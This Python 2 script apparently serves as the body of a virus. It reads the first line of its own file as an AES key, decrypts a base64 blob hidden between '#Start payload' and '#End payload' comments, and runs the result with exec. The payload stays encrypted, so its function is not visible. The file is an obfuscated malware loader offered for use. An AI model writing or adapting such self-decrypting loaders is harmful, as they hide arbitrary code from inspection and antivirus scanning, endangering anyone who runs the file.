print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"



print "lolol"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload